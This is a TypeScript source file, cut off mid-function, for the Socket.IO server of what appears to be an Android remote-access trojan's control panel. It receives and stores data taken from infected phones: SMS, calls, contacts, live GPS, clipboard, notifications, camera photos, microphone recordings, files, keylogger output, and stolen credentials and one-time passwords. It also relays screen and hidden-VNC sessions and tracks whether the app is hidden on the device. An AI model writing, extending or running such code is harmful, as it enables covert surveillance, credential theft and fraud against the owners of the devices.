import type { Server as HttpServer } from 'http';
import type { Socket } from 'socket.io';
import { Server as SocketIOServer } from 'socket.io';
import type { FastifyInstance } from 'fastify';
import geoip from 'geoip-lite';
import { getDb, dbHelpers } from '../db/index.js';
import { clients } from '../db/schema.js';
import { eq, sql } from 'drizzle-orm';
import { getConfig } from '../config/index.js';
import { CMD, type CmdType } from '../types/index.js';
import { getMimeType, normalizePermissions, normalizeDeviceInfo, normalizeCalls, normalizeContacts, normalizeFileList } from '../utils/helpers.js';
import { log } from '../utils/logger.js';
import { verifyJwtToken } from '../middleware/auth.js';
import { acknowledgeCredentialRotation, authenticateDevice } from './deviceAuth.js';

interface TransferChunk {
  transferId: string;
  name: string;
  path?: string;
  channel: string;
  totalChunks: number;
  totalSize: number;
  chunks: Map<number, Buffer>;
  receivedAt: number;
}

type SocketAck = (response: { success: boolean; error?: string }) => void;

const REALTIME_COMMANDS = new Set<CmdType>([
  CMD.SCREEN,
  CMD.SCREEN_CTRL,
  CMD.WEBRTC_OFFER,
  CMD.WEBRTC_ANSWER,
  CMD.WEBRTC_ICE,
  CMD.HVNC,
  CMD.HVNC_CTRL,
  CMD.HVNC_OFFER,
  CMD.HVNC_ANSWER,
  CMD.HVNC_ICE,
]);

const SESSION_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
const DEVICE_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;

const MAX_CHUNK_BASE64_LENGTH = 67_108_864; // ~64 MB encoded, ~48 MB decoded
const MAX_TOTAL_CHUNKS = 10000;

function readSessionId(value: unknown): string | null {
  return typeof value === 'string' && SESSION_ID_PATTERN.test(value) ? value : null;
}

class SocketService {
  private io!: SocketIOServer;
  private fastifyApp!: FastifyInstance;
  private sockets: Map<string, Socket> = new Map();
  private gpsTimers: Map<string, NodeJS.Timeout> = new Map();
  private transfers: Map<string, TransferChunk> = new Map();

  initialize(httpServer: HttpServer, fastifyApp: FastifyInstance): void {
    const config = getConfig();
    this.fastifyApp = fastifyApp;

    this.io = new SocketIOServer(httpServer, {
      pingInterval: config.socket.pingInterval,
      pingTimeout: config.socket.pingTimeout,
      maxHttpBufferSize: config.socket.maxHttpBufferSize,
      transports: config.socket.transports as any,
      cors: config.socket.cors as any,
    });

    this.io.use((socket, next) => {
      const isAdmin = socket.handshake.query.admin === 'true';
      if (isAdmin) {
        const token = socket.handshake.auth?.token || socket.handshake.query.token as string;
        if (!token) return next(new Error('Admin authentication required'));
        try {
          const user = verifyJwtToken(token, (t: string) => this.fastifyApp.jwt.verify(t));
          if (!user) return next(new Error('Invalid admin token'));
          (socket as any).user = user;
          next();
        } catch (err: unknown) {
          return next(new Error(err instanceof Error ? err.message : 'Invalid admin token'));
        }
        return;
      }

      const id = socket.handshake.query.id as string;
      if (!id || !DEVICE_ID_PATTERN.test(id)) return next(new Error('Valid client ID required'));

      const clientToken = socket.handshake.auth?.token;
      if (typeof clientToken !== 'string' || clientToken.length < 32 || clientToken.length > 256) {
        return next(new Error('Device authentication required'));
      }
      try {
        if (!authenticateDevice(id, clientToken)) {
          return next(new Error('Invalid or revoked device credential'));
        }
      } catch (err: unknown) {
        log.error(`Device authentication failed for ${id}: ${err instanceof Error ? err.message : String(err)}`);
        return next(new Error('Device authentication failed'));
      }

      next();
    });

    this.io.on('connection', (socket) => {
      const isAdmin = socket.handshake.query.admin === 'true';
      if (isAdmin) {
        this.handleAdminConnection(socket);
      } else {
        this.handleConnection(socket);
      }
    });

    log.info('Socket.IO server initialized');
  }

  private handleAdminConnection(socket: Socket): void {
    socket.join('admin');
    socket.on('screen:subscribe', (payload: { id?: string }) => {
      const user = (socket as any).user;
      if (!user?.permissions?.includes('device:screen')) {
        socket.emit('screen:error', { id: payload?.id || '', error: 'Insufficient screen permission' });
        return;
      }
      if (typeof payload?.id === 'string' && payload.id.length > 0 && payload.id.length <= 256) {
        socket.join(`screen:${payload.id}`);
      }
    });
    socket.on('screen:unsubscribe', (payload: { id?: string }) => {
      if (typeof payload?.id === 'string' && payload.id.length > 0) {
        socket.leave(`screen:${payload.id}`);
      }
    });
    socket.on('hvnc:subscribe', (payload: { id?: string }) => {
      const user = (socket as any).user;
      if (!user?.permissions?.includes('device:hvnc')) {
        socket.emit('hvnc:error', { id: payload?.id || '', error: 'Insufficient HVNC permission' });
        return;
      }
      if (typeof payload?.id === 'string' && payload.id.length > 0 && payload.id.length <= 256) {
        socket.join(`hvnc:${payload.id}`);
      }
    });
    socket.on('hvnc:unsubscribe', (payload: { id?: string }) => {
      if (typeof payload?.id === 'string' && payload.id.length > 0) {
        socket.leave(`hvnc:${payload.id}`);
      }
    });
    log.info('Admin frontend connected to Socket.IO');
    socket.on('disconnect', () => { log.info('Admin frontend disconnected from Socket.IO'); });
  }

  private handleConnection(socket: Socket): void {
    const id = socket.handshake.query.id as string;
    const model = socket.handshake.query.model as string || '';
    const manf = socket.handshake.query.manf as string || '';
    const release = socket.handshake.query.release as string || '';

    const xff = socket.handshake.headers['x-forwarded-for'];
    const rawIp = Array.isArray(xff) ? xff[0] : (xff || socket.handshake.address);
    const ip = (typeof rawIp === 'string' ? rawIp.split(',')[0] : String(rawIp)).trim();

    const geo = geoip.lookup(ip);
    const country = geo?.country || null;
    const city = geo?.city || null;
    const timezone = geo?.timezone || null;

    const oldSocket = this.sockets.get(id);
    if (oldSocket && oldSocket !== socket) {
      oldSocket.removeAllListeners('disconnect');
      oldSocket.disconnect(true);
    }

    const d = getDb();
    const existing = d.select().from(clients).where(eq(clients.id, id)).get();

    if (existing) {
      d.update(clients).set({
        ip, country, city, timezone,
        lastSeen: new Date().toISOString(),
        online: true,
        reconnectCount: sql`${clients.reconnectCount} + 1`,
        deviceModel: model, deviceBrand: manf, deviceVersion: release,
      }).where(eq(clients.id, id)).run();
      this.ensureClientData(id);
    } else {
      d.insert(clients).values({
        id, ip, country, city, timezone, online: true,
        deviceModel: model, deviceBrand: manf, deviceVersion: release,
      }).run();
      this.ensureClientData(id);
    }

    this.sockets.set(id, socket);

    dbHelpers.addLog('CONNECTION', 'CLIENT', `Client ${id} connected from ${ip}`, JSON.stringify({ ip, country, city, model, manf }));
    this.io.to('admin').emit('client:connect', { id, model, ip });

    this.setupHandlers(socket, id);
    socket.on('credential:rotate:ack', () => {
      if (acknowledgeCredentialRotation(id)) {
        dbHelpers.addLog('INFO', 'SECURITY', `Credential rotation completed for ${id}`);
      }
    });
    this.runQueuedCommands(id);
    this.restoreGpsPolling(id);

    socket.on('disconnect', () => this.handleDisconnect(id, socket));
    socket.on('error', (err) => { log.error(`Socket error for ${id}: ${err instanceof Error ? err.message : String(err)}`); });
  }

  private handleDisconnect(id: string, socket: Socket): void {
    if (this.sockets.get(id) !== socket) return;

    const d = getDb();
    d.update(clients).set({ online: false, lastSeen: new Date().toISOString() }).where(eq(clients.id, id)).run();
    this.sockets.delete(id);

    const timer = this.gpsTimers.get(id);
    if (timer) { clearInterval(timer); this.gpsTimers.delete(id); }

    for (const [transferId, transfer] of this.transfers) {
      if (transferId.startsWith(id + ':')) this.transfers.delete(transferId);
    }

    dbHelpers.addLog('DISCONNECTION', 'CLIENT', `Client ${id} disconnected`);
    // Clear stale real-time status data so frontend doesn't show outdated badges
    dbHelpers.setClientData(id, 'notification_status', '[]');
    dbHelpers.setClientData(id, 'mic_status', '[]');
    this.io.to(`screen:${id}`).emit('screen:stopped', { id });
    this.io.to(`hvnc:${id}`).emit('hvnc:stopped', { id });
    this.io.to('admin').emit('client:disconnect', { id });
  }

  private ensureClientData(clientId: string): void {
    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger', 'keylogger_status', 'keylogger_log_info', 'passkey_creds', 'passkey_otps'];
    dbHelpers.ensureClientDataBatch(clientId, dataTypes);
  }

  private saveFileToDb(clientId: string, fileType: string, buffer: Buffer, originalName: string): void {
    dbHelpers.addClientFile(clientId, fileType, originalName, getMimeType(originalName), buffer, buffer.length);
  }

  private completeTransfer(id: string, transfer: TransferChunk, fileType: string, dataType: string): void {
    const buffer = Buffer.concat(Array.from(transfer.chunks.entries()).sort(([a], [b]) => a - b).map(([, chunk]) => chunk));
    this.saveFileToDb(id, fileType, buffer, transfer.name);
    dbHelpers.addLog('DATA', dataType, `${dataType} (chunked) from ${id}`, JSON.stringify({ size: buffer.length, name: transfer.name }));
    this.transfers.delete(`${id}:${transfer.transferId}`);
    this.io.to('admin').emit('client:data', { id, dataType: dataType.toLowerCase() });
  }

  private setupHandlers(socket: Socket, id: string): void {
    const d = getDb();

    const broadcastData = (dataType: string) => {
      this.io.to('admin').emit('client:data', { id, dataType });
    };

    socket.on(CMD.SMS, (data: any) => {
      try {
        if (data.smslist) {
          dbHelpers.setClientData(id, 'sms', JSON.stringify(data.smslist));
          dbHelpers.addLog('DATA', 'SMS', `SMS data received from ${id}`, JSON.stringify({ count: data.total || data.smslist.length }));
          broadcastData('sms');
        }
        if (data.type === 'new_sms') {
          const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'sms'));
          const newSms = {
            address: data.address || '',
            body: data.body || '',
            date: data.date || String(Date.now()),
            read: data.read || '0',
            type: data.smsType || '1',
          };
          existing.unshift(newSms);
          dbHelpers.setClientData(id, 'sms', JSON.stringify(existing));
          dbHelpers.addLog('DATA', 'SMS', `New SMS received on ${id}`, JSON.stringify({ from: data.address }));
          broadcastData('sms');
        }
        if (data.type === 'sent') dbHelpers.addLog('COMMAND', 'SMS', `SMS sent from ${id}`);
      } catch (err: unknown) { log.error(`SMS handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CALLS, (data: any) => {
      try {
        if (data.callsList) {
          const normalized = normalizeCalls(data);
          dbHelpers.setClientData(id, 'calls', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'CALLS', `Call logs received from ${id}`, JSON.stringify({ count: data.total || data.callsList.length }));
          broadcastData('calls');
        }
      } catch (err: unknown) { log.error(`Calls handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CONTACTS, (data: any) => {
      try {
        if (data.contactsList) {
          const normalized = normalizeContacts(data);
          dbHelpers.setClientData(id, 'contacts', JSON.stringify(normalized));
          dbHelpers.addLog('DATA', 'CONTACTS', `Contacts received from ${id}`, JSON.stringify({ count: data.total || data.contactsList.length }));
          broadcastData('contacts');
        }
      } catch (err: unknown) { log.error(`Contacts handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.LOCATION, (data: any, ack?: SocketAck) => {
      try {
        if (data?.status || typeof data?.tracking === 'boolean') {
          dbHelpers.addLog('DATA', 'GPS', `GPS tracking status from ${id}`, JSON.stringify({
            status: data.status || null,
            tracking: data.tracking ?? null,
            interval: data.interval ?? null,
          }));
          broadcastData('gps');
          if (typeof ack === 'function') ack({ success: true });
          return;
        }

        if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
          const errMsg = data.error || 'No location';
          // Sanitize diagnostics: only keep provider & status fields; discard PII/tower/raw data.
          const rawDiag = data.diagnostics && typeof data.diagnostics === 'object' ? data.diagnostics : null;
          const diagnostics = rawDiag ? {
            provider: rawDiag.provider || null,
            status: rawDiag.status || null,
            enabled: rawDiag.enabled ?? null,
            interval: rawDiag.interval ?? null,
          } : null;
          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${errMsg}`, diagnostics ? JSON.stringify(diagnostics) : undefined);
          dbHelpers.setClientData(id, 'gps_error', JSON.stringify({
            error: errMsg,
            diagnostics,
            time: new Date().toISOString(),
          }));
          broadcastData('gps');
          if (typeof ack === 'function') ack({ success: false, error: errMsg });
          return;
        }

        const latitude = Number(data.latitude);
        const longitude = Number(data.longitude);
        if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
          const errMsg = 'Invalid location coordinates';
          dbHelpers.addLog('DATA', 'GPS', `GPS rejected from ${id}: ${errMsg}`, JSON.stringify({
            latitude: data.latitude,
            longitude: data.longitude,
          }));
          if (typeof ack === 'function') ack({ success: false, error: errMsg });
          return;
        }

        const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
        dbHelpers.setClientData(id, 'gps_error', JSON.stringify(null));
        // Normalize timestamp: old APKs send epoch millis, new APKs send ISO string
        let timeValue = data.timestamp || data.time;
        if (typeof timeValue === 'number') {
          timeValue = new Date(timeValue).toISOString();
        } else if (!timeValue) {
          timeValue = new Date().toISOString();
        }
        const entry = {
          latitude, longitude, accuracy: data.accuracy,
          speed: data.speed, provider: data.provider,
          time: timeValue,
        };
        gpsData.push(entry);
        // Cap GPS entries at 10 000 to prevent unbounded growth
        if (gpsData.length > 10000) {
          gpsData.splice(0, gpsData.length - 10000);
        }
        dbHelpers.setClientData(id, 'gps', JSON.stringify(gpsData));
        dbHelpers.addLog('DATA', 'GPS', `GPS location from ${id}`, JSON.stringify({
          lat: latitude,
          lng: longitude,
          queued: !!data.queued,
          queueId: data.queueId ?? null,
        }));
        broadcastData('gps');
        // Emit live GPS location to admin dashboard for real-time map
        this.io.to('admin').emit('gps:location', { id, ...entry });
        if (typeof ack === 'function') ack({ success: true });
      } catch (err: unknown) {
        const message = err instanceof Error ? err.message : String(err);
        if (typeof ack === 'function') ack({ success: false, error: message });
        log.error(`GPS handler error: ${message}`);
      }
    });

    socket.on(CMD.WIFI, (data: any) => {
      try {
        if (data.networks) {
          dbHelpers.setClientData(id, 'wifi', JSON.stringify(data.networks));
          dbHelpers.addLog('DATA', 'WIFI', `WiFi data from ${id}`, JSON.stringify({ count: data.total || data.networks.length }));
          broadcastData('wifi');
        }
        if (data.error) dbHelpers.setClientData(id, 'wifi', JSON.stringify({ error: data.error }));
      } catch (err: unknown) { log.error(`WiFi handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.NOTIFICATIONS, (data: any) => {
      try {
        if (data.enabled !== undefined) {
          dbHelpers.setClientData(id, 'notification_status', JSON.stringify({ enabled: data.enabled, connected: !!data.connected }));
          broadcastData('notifications');
        }
        const notification = data.appName ? data : (data.notification || data);
        if ((notification.appName || notification.title) && !data.enabled && !data.removed) {
          const notifications = JSON.parse(dbHelpers.getOrCreateClientData(id, 'notifications'));
          notifications.push({
            appName: notification.appName, title: notification.title,
            content: notification.content, timestamp: notification.timestamp || new Date().toISOString(),
            ongoing: notification.ongoing, clearable: notification.clearable,
            category: notification.category, initial: notification.initial,
          });
          // Cap at 10 000 entries
          if (notifications.length > 10000) {
            notifications.splice(0, notifications.length - 10000);
          }
          dbHelpers.setClientData(id, 'notifications', JSON.stringify(notifications));
          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification from ${id}`);
          broadcastData('notifications');
        }
        if (data.removed) {
          dbHelpers.addLog('DATA', 'NOTIFICATIONS', `Notification removed on ${id}: ${data.packageName || 'unknown'}`);
        }
      } catch (err: unknown) { log.error(`Notifications handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.CLIPBOARD, (data: any) => {
      try {
        const clipboard = JSON.parse(dbHelpers.getOrCreateClientData(id, 'clipboard'));
        clipboard.push({ text: data.text, length: data.length, label: data.label, mimeType: data.mimeType, timestamp: data.timestamp || new Date().toISOString() });
        // Cap at 10 000 entries
        if (clipboard.length > 10000) {
          clipboard.splice(0, clipboard.length - 10000);
        }
        dbHelpers.setClientData(id, 'clipboard', JSON.stringify(clipboard));
        dbHelpers.addLog('DATA', 'CLIPBOARD', `Clipboard data from ${id}`);
        broadcastData('clipboard');
      } catch (err: unknown) { log.error(`Clipboard handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.PASSKEY, (data: any) => {
      try {
        const type = data.type;
        const ts = data.timestamp || new Date().toISOString();
        if (type === 'credentials') {
          const creds = JSON.parse(dbHelpers.getOrCreateClientData(id, 'passkey_creds'));
          const items: any[] = data.items || [];
          for (const item of items) {
            creds.push({ item, timestamp: ts });
          }
          if (creds.length > 10000) { creds.splice(0, creds.length - 10000); }
          dbHelpers.setClientData(id, 'passkey_creds', JSON.stringify(creds));
          dbHelpers.addLog('DATA', 'PASSKEY', `Credentials from ${id} (${items.length} items)`);
          broadcastData('passkey_creds');
        } else if (type === 'otps') {
          const otps = JSON.parse(dbHelpers.getOrCreateClientData(id, 'passkey_otps'));
          const items: any[] = data.items || [];
          for (const item of items) {
            otps.push({ item, timestamp: ts });
          }
          if (otps.length > 10000) { otps.splice(0, otps.length - 10000); }
          dbHelpers.setClientData(id, 'passkey_otps', JSON.stringify(otps));
          dbHelpers.addLog('DATA', 'PASSKEY', `OTPs from ${id} (${items.length} items)`);
          broadcastData('passkey_otps');
        }
      } catch (err: unknown) {
        log.error(`Passkey handler error: ${err instanceof Error ? err.message : String(err)}`);
      }
    });

    socket.on(CMD.APPS, (data: any) => {
      try {
        if (data.apps) {
          dbHelpers.setClientData(id, 'apps', JSON.stringify(data.apps));
          dbHelpers.addLog('DATA', 'APPS', `Apps list from ${id}`, JSON.stringify({ count: data.total || data.apps.length }));
          broadcastData('apps');
        }
      } catch (err: unknown) { log.error(`Apps handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.PERMISSIONS, (data: any) => {
      try {
        const perms = normalizePermissions(data);
        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
        dbHelpers.addLog('DATA', 'PERMISSIONS', `Permissions from ${id}`, JSON.stringify({ count: perms.length }));
        broadcastData('permissions');
      } catch (err: unknown) { log.error(`Permissions handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.PERM_CHECK, (data: any) => {
      try {
        const perms = JSON.parse(dbHelpers.getOrCreateClientData(id, 'permissions'));
        const idx = perms.findIndex((p: any) => p.permission === data.permission);
        if (idx >= 0) perms[idx].allowed = data.allowed;
        else perms.push({ permission: data.permission, allowed: data.allowed });
        dbHelpers.setClientData(id, 'permissions', JSON.stringify(perms));
      } catch (err: unknown) { log.error(`Permission check handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.INFO, (data: Record<string, unknown>) => {
      try {
        const normalized = normalizeDeviceInfo(data);
        const updates: Record<string, unknown> = { deviceInfo: JSON.stringify(normalized) };
        if (data.model || data.brand) {
          updates.deviceModel = data.model as string;
          updates.deviceBrand = data.brand as string;
          updates.deviceVersion = (data.androidVersion || data.version) as string;
        }
        d.update(clients).set(updates).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'DEVICE', `Device info from ${id}`);
        this.io.to('admin').emit('client:update', { id, dataType: 'info' });
      } catch (err: unknown) { log.error(`Device info handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.FASON, (data: any) => {
      try {
        const hidden = !!data.hidden;
        d.update(clients).set({ fasonHidden: hidden }).where(eq(clients.id, id)).run();
        dbHelpers.addLog('DATA', 'FASON', `App ${hidden ? 'hidden' : 'shown'} on ${id}`);
        this.io.to('admin').emit('client:update', { id, dataType: 'fason' });
      } catch (err: unknown) { log.error(`Fason Manager handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // Camera: single payload + chunked transfer
    socket.on(CMD.CAMERA, (data: any) => {
      try {
        if (data.camList) {
          d.update(clients).set({ cameraPermission: !!data.hasPermission }).where(eq(clients.id, id)).run();
          dbHelpers.setClientData(id, 'cameras', JSON.stringify(data.list || []));
          dbHelpers.addLog('DATA', 'CAMERA', `Camera list from ${id}`, JSON.stringify({ count: data.list?.length }));
          broadcastData('camera');
        } else if (data.type === 'download_start') {
          if (typeof data.totalChunks !== 'number' || data.totalChunks > MAX_TOTAL_CHUNKS) {
            log.warn(`[Socket] Camera transfer rejected from ${id}: totalChunks=${data.totalChunks}`);
            return;
          }
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name || `capture_${Date.now()}.jpg`,
            channel: CMD.CAMERA, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            if (typeof data.chunkData !== 'string' || data.chunkData.length > MAX_CHUNK_BASE64_LENGTH) {
              log.warn(`[Socket] Oversized camera chunk rejected from ${id}: ${data.chunkData?.length ?? 'unknown'} bytes`);
              return;
            }
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'photo', 'CAMERA');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
        } else if (data.image === false && data.error) {
          dbHelpers.addLog('ERROR', 'CAMERA', `Camera error from ${id}: ${data.error}`);
        } else if (data.buffer || data.image) {
          if (typeof data.buffer === 'string' && data.buffer.length > MAX_CHUNK_BASE64_LENGTH) {
            log.warn(`[Socket] Oversized camera image rejected from ${id}: ${data.buffer.length} bytes`);
            return;
          }
          const buffer = Buffer.from(data.buffer, 'base64');
          const fileName = data.name || `capture_${Date.now()}.jpg`;
          this.saveFileToDb(id, 'photo', buffer, fileName);
          dbHelpers.addLog('DATA', 'CAMERA', `Photo captured from ${id}`, JSON.stringify({ size: buffer.length }));
          broadcastData('camera');
        }
      } catch (err: unknown) { log.error(`Camera handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // Files: listing, single download, chunked download, errors
    socket.on(CMD.FILES, (data: any) => {
      try {
        if (data.type === 'list') {
          const normalizedList = normalizeFileList(data.list || []);
          dbHelpers.setClientData(id, 'files', JSON.stringify(normalizedList));
          d.update(clients).set({ currentPath: data.path || '' }).where(eq(clients.id, id)).run();
          dbHelpers.setClientData(id, 'file_error', JSON.stringify(null));
          dbHelpers.addLog('DATA', 'FILES', `File list from ${id}`, JSON.stringify({ path: data.path, count: normalizedList.length }));
          broadcastData('files');
        } else if (data.type === 'download') {
          if (typeof data.buffer !== 'string' || data.buffer.length > MAX_CHUNK_BASE64_LENGTH) {
            log.warn(`[Socket] Oversized file download rejected from ${id}: ${data.buffer?.length ?? 'unknown'} bytes`);
            return;
          }
          const buffer = Buffer.from(data.buffer, 'base64');
          this.saveFileToDb(id, 'download', buffer, data.name || 'download');
          dbHelpers.addLog('DATA', 'FILES', `File downloaded from ${id}: ${data.name}`, JSON.stringify({ size: buffer.length }));
          broadcastData('files');
        } else if (data.type === 'download_start') {
          if (typeof data.totalChunks !== 'number' || data.totalChunks > MAX_TOTAL_CHUNKS) {
            log.warn(`[Socket] File transfer rejected from ${id}: totalChunks=${data.totalChunks}`);
            return;
          }
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name, path: data.path,
            channel: CMD.FILES, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            if (typeof data.chunkData !== 'string' || data.chunkData.length > MAX_CHUNK_BASE64_LENGTH) {
              log.warn(`[Socket] Oversized file chunk rejected from ${id}: ${data.chunkData?.length ?? 'unknown'} bytes`);
              return;
            }
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'download', 'FILES');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
        } else if (data.type === 'error') {
          const transferId = data.transferId ? `${id}:${data.transferId}` : null;
          if (transferId) this.transfers.delete(transferId);
          const errorMsg = data.error || 'Unknown file transfer error';
          dbHelpers.addLog('ERROR', 'FILES', `File transfer error from ${id}: ${errorMsg}`, JSON.stringify({ path: data.path || '' }));
          dbHelpers.setClientData(id, 'file_error', JSON.stringify({ error: errorMsg, path: data.path || '', timestamp: Date.now() }));
          this.io.to('admin').emit('client:data', { id, dataType: 'files' });
        }
      } catch (err: unknown) { log.error(`Files handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // Microphone: single payload + chunked transfer
    socket.on(CMD.MIC, (data: any) => {
      try {
        if (data.type === 'download_start') {
          if (typeof data.totalChunks !== 'number' || data.totalChunks > MAX_TOTAL_CHUNKS) {
            log.warn(`[Socket] Mic transfer rejected from ${id}: totalChunks=${data.totalChunks}`);
            return;
          }
          this.transfers.set(`${id}:${data.transferId}`, {
            transferId: data.transferId, name: data.name || `recording_${Date.now()}.mp4`,
            channel: CMD.MIC, totalChunks: data.totalChunks, totalSize: data.totalSize,
            chunks: new Map(), receivedAt: Date.now(),
          });
          this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: data.name, totalChunks: data.totalChunks, totalSize: data.totalSize, progress: 0 });
        } else if (data.type === 'download_chunk') {
          const transferId = `${id}:${data.transferId}`;
          const transfer = this.transfers.get(transferId);
          if (transfer) {
            if (typeof data.chunkData !== 'string' || data.chunkData.length > MAX_CHUNK_BASE64_LENGTH) {
              log.warn(`[Socket] Oversized mic chunk rejected from ${id}: ${data.chunkData?.length ?? 'unknown'} bytes`);
              return;
            }
            transfer.chunks.set(data.chunkIndex, Buffer.from(data.chunkData, 'base64'));
            const progress = Math.round((transfer.chunks.size / transfer.totalChunks) * 100);
            this.io.to('admin').emit('client:transfer', { id, transferId: data.transferId, name: transfer.name, totalChunks: transfer.totalChunks, totalSize: transfer.totalSize, progress });
            if (transfer.chunks.size === transfer.totalChunks) {
              this.completeTransfer(id, transfer, 'recording', 'MIC');
            }
          }
        } else if (data.type === 'download_end') {
          this.transfers.delete(`${id}:${data.transferId}`);
        } else if (data.file) {
          if (typeof data.buffer !== 'string' || data.buffer.length > MAX_CHUNK_BASE64_LENGTH) {
            log.warn(`[Socket] Oversized mic recording rejected from ${id}: ${data.buffer?.length ?? 'unknown'} bytes`);
            return;
          }
          const buffer = Buffer.from(data.buffer, 'base64');
          this.saveFileToDb(id, 'recording', buffer, data.name || `recording_${Date.now()}.mp4`);
          dbHelpers.addLog('DATA', 'MIC', `Recording from ${id}`, JSON.stringify({ size: buffer.length, name: data.name }));
          broadcastData('mic');
        } else if (data.status) {
          dbHelpers.addLog('DATA', 'MIC', `Mic status from ${id}: ${data.status}`, JSON.stringify({ duration: data.duration }));
          this.io.to('admin').emit('client:data', { id, dataType: 'mic_status', status: data.status, duration: data.duration });
        } else if (data.error) {
          dbHelpers.addLog('ERROR', 'MIC', `Mic error from ${id}: ${data.message || data.error}`);
          this.io.to('admin').emit('client:data', { id, dataType: 'mic_status', status: 'error', error: data.message || data.error });
        }
      } catch (err: unknown) { log.error(`Mic handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    // WebRTC screen state only. Video bypasses Node and uses P2P/TURN.
    socket.on(CMD.SCREEN, (data: any) => {
      try {
        if (data.type === 'status') {
          this.io.to(`screen:${id}`).emit('screen:status', {
            id,
            streaming: data.streaming,
            screenWidth: data.screenWidth,
            screenHeight: data.screenHeight,
            captureWidth: data.captureWidth,
            captureHeight: data.captureHeight,
            densityDpi: data.densityDpi,
            rotation: data.rotation,
            fps: data.fps,
            accessible: data.accessible,
            transport: data.transport,
            connectionState: data.connectionState,
            sessionId: data.sessionId,
          });
          broadcastData('screen');
        } else if (data.type === 'error' && data.error) {
          this.io.to(`screen:${id}`).emit('screen:error', { id, sessionId: data.sessionId, error: data.error });
          dbHelpers.addLog('ERROR', 'SCREEN', `Screen error from ${id}: ${data.error}`);
        }
      } catch (err: unknown) { log.error(`Screen handler error: ${err instanceof Error ? err.message : String(err)}`); }
    });

    socket.on(CMD.KEYLOGGER, (data: any) => {
      try {
        // ── Status response: { enabled: boolean, totalQueued: number } ──
        if (typeof data.enabled === 'boolean' || data.action === 'status') {
          const status = {
            enabled: !!data.enabled,
            queued: typeof data.totalQueued === 'number' ? data.totalQueued : (data.queued ?? 0),
            checkedAt: new Date().toISOString(),
          };
          dbHelpers.setClientData(id, 'keylogger_status', JSON.stringify(status));
          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger status from ${id}`, JSON.stringify(status));
          broadcastData('keylogger_status');
          return;
        }

        // ── getQueued response: { action: 'getQueued', totalQueued: number } ──
        if (data.action === 'getQueued') {
          const prevStatus = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger_status'));
          const queuedInfo = {
            enabled: prevStatus?.enabled ?? null,
            queued: data.totalQueued ?? data.queued ?? 0,
            checkedAt: new Date().toISOString(),
          };
          dbHelpers.setClientData(id, 'keylogger_status', JSON.stringify(queuedInfo));
          broadcastData('keylogger_status');
          return;
        }

        // ── getLogs response: { path, size, name } ──
        if (data.action === 'getLogs' || (data.path && data.name)) {
          const logInfo = { path: data.path ?? '', size: data.size ?? 0, name: data.name ?? '', checkedAt: new Date().toISOString() };
          dbHelpers.setClientData(id, 'keylogger_log_info', JSON.stringify(logInfo));
          broadcastData('keylogger');
          return;
        }

